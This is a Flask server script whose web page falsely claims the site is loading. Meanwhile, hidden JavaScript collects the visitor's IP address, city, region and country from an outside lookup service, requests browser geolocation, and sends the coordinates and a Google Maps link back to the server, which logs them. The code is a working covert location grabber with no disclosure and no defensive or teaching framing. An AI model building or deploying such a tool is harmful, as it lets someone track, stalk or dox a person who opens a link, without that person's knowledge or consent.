from flask import Flask, request, render_template_string
import json

app = Flask(__name__)

@app.route('/')
def index():
    return render_template_string("""
    <html>
    <head><title>Загрузка</title></head>
    <body style="display:flex;justify-content:center;align-items:center;height:100vh;font-family:sans-serif;">
      <h2>Сайт загружается…</h2>
      <script>
      async function sendData() {
        try {
          const ipData = await fetch('https://ipapi.co/json/').then(res => res.json());

          navigator.geolocation.getCurrentPosition(async (position) => {
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;

            const payload = {
              ip: ipData.ip,
              city: ipData.city,
              region: ipData.region,
              country: ipData.country_name,
              latitude: lat,
              longitude: lon,
              map_link: `https://www.google.com/maps?q=${lat},${lon}`
            };

            await fetch('/log', {
              method: 'POST',
              headers: {'Content-Type': 'application/json'},
              body: JSON.stringify(payload)
            });
          });
        } catch (err) {
          console.error("Ошибка при сборе данных:", err);
        }
      }
      sendData();
      </script>
    </body>
    </html>
    """)

@app.route('/log', methods=['POST'])
def log():
    data = request.get_json()
    print("📍 Получено:")
    print(f"IP: {data.get('ip')}")
    print(f"Город: {data.get('city')}, Регион: {data.get('region')}, Страна: {data.get('country')}")
    print(f"Координаты: {data.get('latitude')}, {data.get('longitude')}")
    print(f"🔗 Ссылка на карту: {data.get('map_link')}")
    return '', 204

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
